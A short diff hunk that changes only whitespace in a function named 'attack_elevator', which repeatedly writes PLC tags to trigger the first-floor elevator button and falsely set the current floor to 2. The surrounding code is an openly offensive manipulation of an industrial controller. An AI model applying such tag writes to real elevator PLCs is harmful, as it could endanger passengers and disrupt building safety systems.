@@ -33,7 +33,7 @@ def attack_elevator(plc_ip):
             try:
                 # Keep triggering the first floor elevator button
                 write_plc_tag(plc, BUTTON_LEVEL1_TAG, 1, 'BOOL')
-                
+
                 # Set the current floor to 2
                 write_plc_tag(plc, CURRENT_LEVEL_TAG, 2, 'INT')
 
